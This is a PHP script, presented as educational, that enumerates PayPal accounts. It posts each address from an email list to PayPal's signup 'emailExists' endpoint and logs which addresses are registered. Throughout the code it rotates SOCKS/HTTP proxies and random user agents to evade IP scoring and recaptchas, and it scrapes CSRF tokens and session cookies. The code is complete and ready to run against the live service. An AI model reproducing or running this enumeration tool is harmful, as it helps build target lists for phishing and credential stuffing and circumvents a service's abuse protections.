<?php
ini_set('max_execution_time', 9192900);
error_reporting( E_ALL );
		/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
		*
		*   THIS IS FOR EDUCATIONAL PURPOSES ONLY
		*  
		* This is to demonstrate how easy it can be to make an automatic robot to get data from sites, if they don't hide the csrf token properly.
		* Just with PHP and the powerful Curl
		*
		*  I used paypal because have good security, that's because is good for an example.
		*
		* The script don't work well unless you use clean proxies, 
		*   in this case as it is payal so they have a good ip score detection system,
		*    you must use clean proxies otherwise you will not be able to get results because high rate recaptchas.
		*
		*
		* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
		* * * * * * * * * * * * * * * * * * * * * * * BY  ZEKE * * * * * * * * * * * * * * * * * * * * * * */ 
class curl
{
	private $ch; 
    protected $info;
    protected $error;
    public function __construct()
    {
		#$this->agent = $this->get_agent(rand(0,44));
		$this->ch = curl_init();
		curl_setopt($this->ch,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($this->ch,CURLOPT_FOLLOWLOCATION,1);
	    curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT, 120);
		curl_setopt($this->ch, CURLOPT_TIMEOUT, 120);
	    curl_setopt($this->ch, CURLOPT_ENCODING, "");
		curl_setopt($this->ch,CURLOPT_SSL_VERIFYPEER,true);
		curl_setopt($this->ch, CURLOPT_AUTOREFERER, true);
    } 
    function setHeadOutput($activated){
    	curl_setopt($this->ch, CURLOPT_HEADER,$activated);
		curl_setopt($this->ch, CURLINFO_HEADER_OUT, $activated);
    }
	function cookies($file_cook){
	   curl_setopt($this->ch,CURLOPT_COOKIEJAR,realpath($file_cook));
	   curl_setopt($this->ch,CURLOPT_COOKIEFILE,realpath($file_cook));
	}
	function cookies2($cookiesIn){
	  curl_setopt($this->ch,CURLOPT_COOKIE,$cookiesIn);
	}
    function socks($proxy,$type,$auth=null)
    {  
	    if ($proxy != 'null') {
	      $parts = explode(':', $proxy);
	      $ip = $parts[0];  $port = $parts[1];
	      curl_setopt($this->ch, CURLOPT_HTTPPROXYTUNNEL, 1);
	      curl_setopt($this->ch, CURLOPT_PROXY, $ip);
	      curl_setopt($this->ch, CURLOPT_PROXYPORT, $port);
	      switch ($type) {
	        case 'socks4':
	          curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4); break;
	        case 'socks5':
	          curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); break;
	        case 'http':
	          curl_setopt($this->ch, CURLOPT_PROXYTYPE, 'HTTP'); break;
	        default: break;
	      }
	      if ($auth == true) {
	        $loginpassw  = $parts[2] . ":" . $parts[3]; 
	        curl_setopt($this->ch, CURLOPT_PROXYUSERPWD, $loginpassw);
	      }
	    }
    } 
	function getInfo(){ return $this->info; }

	function httpcode(){  return curl_getinfo($this->ch,CURLINFO_HTTP_CODE); }
 
	function httpHeader($headers){  curl_setopt($this->ch,CURLOPT_HTTPHEADER,$headers); }

	function close(){  curl_close($this->ch); }

	function makeRequest($url,$post_data=false){
	  curl_setopt($this->ch,CURLOPT_URL,$url);
	  if($post_data != false){
	    curl_setopt($this->ch,CURLOPT_POST,1);
	    curl_setopt($this->ch,CURLOPT_POSTFIELDS,$post_data);
	  }else{
	    curl_setopt($this->ch,CURLOPT_POST,0);
	  }
	  $data= curl_exec($this->ch);
	  #$this->error = curl_error ($this->ch);
	  #$this->info = curl_getinfo ($this->ch);
	  return $data;
	}
}


function saveError($data=null,$code=null){ }

function checkData($data){
    if (preg_match("/ya tiene/",$data) || preg_match("/like you already have/", $data)) return  'yes';
    if (preg_match('/I confirm that I want to create a PayPal account/', $data) || preg_match("/Found./",$data)) return 'not_found'; 
    return 'error';
}
function getGetHeaders($usagent){
	return [
			'User-Agent: '.$usagent,
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
			'Accept-Language: en-US,en;q=0.5',
			'DNT: 1',
			'Connection: keep-alive',
			'Upgrade-Insecure-Requests: 1',
			'sec-fetch-dest: document',
			'Host: www.paypal.com'
		];
}
function getPostHeaders($usagent,$token,$cookiesOut){
    return [
			'User-Agent: '.$usagent,
			'Accept: application/json',
			'Accept-Language: en-US,en;q=0.5',
			'Content-Type: application/json;charset=utf-8',
			'x-csrf-token: '.$token,
			'Cookie: '.$cookiesOut,
			'DNT: 1', 
			'Connection: keep-alive',
			'Referer: https://www.paypal.com/br/welcome/signup/',
		];
}
function goodRequest($code,$data){
	return $code != 404 && $code != 403 && $code != 0 && !preg_match('/Access Denied/', $data) && $data != false;
}
function makeProxyArray($p){
  foreach ($p as $proxy) { $multiplied[] = $p; } 
  return $multiplied[0];
}
function multiplyProxys($p){
  $count = count($p); $multiplied=[];
  switch (true) {
    case $count < 60:
      for ($i=0; $i < 500; $i++) { $arr2 = makeProxyArray($p); $multiplied = array_merge($multiplied,$arr2); }
      break;
    case $count < 110:
      for ($i=0; $i < 400; $i++) { $arr2 = makeProxyArray($p); $multiplied = array_merge($multiplied,$arr2);  }
      break;
    case $count > 109 && $count < 500:
      for ($i=0; $i < 320; $i++) { $arr2 = makeProxyArray($p); $multiplied = array_merge($multiplied,$arr2);  }
      break;
    case $count > 499 && $count < 1000:
      for ($i=0; $i < 120; $i++) { $arr2 = makeProxyArray($p); $multiplied = array_merge($multiplied,$arr2);  }
      break;
    case $count > 999 && $count < 3000:
      for ($i=0; $i < 40; $i++) { $arr2 = makeProxyArray($p); $multiplied = array_merge($multiplied,$arr2);  }
      break;
    case $count > 999 && $count < 3000:
      for ($i=0; $i < 10; $i++) { $arr2 = makeProxyArray($p); $multiplied = array_merge($multiplied,$arr2);  }
      break;
      case $count > 2999:
          for ($i=0; $i < 4; $i++) { $arr2 = makeProxyArray($p); $multiplied = array_merge($multiplied,$arr2);  }
          break;
    default:  break;
  }
  return $multiplied;
}


$e=0;
$cook = './cook.txt';
$url = 'https://www.paypal.com/br/welcome/signup';
$postUrl ='https://www.paypal.com/welcome/rest/v1/emailExists';
//emails to check
$contacts = explode(PHP_EOL, file_get_contents('emails.txt'));
$usagents = explode(PHP_EOL,file_get_contents('useragents.txt'));
$proxyType = "socks4";  // socks4,socks5,http
$proxyAuth = false;  // boolean

$proxys = explode(PHP_EOL, file_get_contents('proxys.txt')); 
$proxys = multiplyProxys($proxys);
for ($i=0; $i < count($proxys); $i++) {
	$email = $contacts[$i];
	$usagent = $usagents[rand(0, (count($usagents) -1) )];
	$curl = new curl;
  	$curl->socks( $proxys[$e] , $proxyType , $proxyAuth );
	$curl->httpHeader(getGetHeaders($usagent));
	$curl->cookies($cook);
	$curl->setHeadOutput(true);
	$data = $curl->makeRequest($url);
	$httpcode = $curl->httpcode();
	if (goodRequest($httpcode,$data)) { 
        $header = $curl->getInfo();
        $header_content = substr($data, 0, $header['header_size']);
        $body_content = trim(str_replace($header_content, '', $data));
        
        // save get response cookies
        $pattern = "#Set-Cookie:\\s+(?<cookie>[^=]+=[^;]+)#m"; 
        preg_match_all($pattern, $header_content, $matches);
		$cookiesOut = implode("; ", $matches['cookie']);
        if ($cookiesOut == '') {
        	$pattern = "#set-cookie:\\s+(?<cookie>[^=]+=[^;]+)#m"; 
	        preg_match_all($pattern, $header_content, $matches);
	        $cookiesOut = implode("; ", $matches['cookie']);
        }
        // get csrf token, working anyway without it
	    preg_match_all('(name="_csrf" value="(.*)")siU', $data, $match);
	    $token = $match[1][0];

	   
		$curl->setHeadOutput(false);  //dont need anymore cookies in response
	    $curl->cookies2($cookiesOut);
	    $curl->httpHeader(getPostHeaders($usagent,$token,$cookiesOut));
	    $curl->socks($proxys[$e],$proxyType,$proxyAuth);
	    $curl->cookies($cook);
		# $postData = '{"email":"'.$email.'","_csrf":"'.$token.'","anw_sid":"'.$token2.'"}';
	    $postData = '{"email":"'.$email.'"}';
        $data = $curl->makeRequest($postUrl,$postData);
	    $code = $curl->httpcode();
	    $curl->cookies('');
	    file_put_contents('./cook.txt', '');
	    $curl->close();
		if(goodRequest($code,$data)) {  // if second request was not 403 or 0 ..
		   $result = json_decode($data,true);
		   if (isset($result['emailExists'])) {
			    switch ($result['emailExists']) {
		    	    case true:
					    file_put_contents('emails_checked.txt', $email . ','.$name.PHP_EOL,FILE_APPEND);
					    break;
				    case false:
					    file_put_contents('not_found.txt', $email . ','. $name . PHP_EOL,FILE_APPEND);
					    break;
					default:
						#saveError();
						break;
				}	
				$e++;continue;
		   }elseif(isset($result['htmlResponse'])){ //this parameter exist only if return some error
		   	    #saveError($data,$code);
		  	    $i--; $e++;continue;
		   }else{ //other error
		   		file_put_contents('data_err_4', $data.PHP_EOL.'********'.PHP_EOL,FILE_APPEND);
		   	    $i--; $e++;continue;
		   }
		}else{ // if forbidden 403 or 0 in POST request..
			#saveError($data,$code); 
		    $i--; $e++;continue;
		}
	}else{ // if forbidden 403 or 0 in GET request..
	    $curl->cookies('');
	    file_put_contents('./cook.txt', '');
	    $curl->close();
		#saveError($data,$httpcode);
	    $i--; $e++;continue;
	}
	$e++;
}  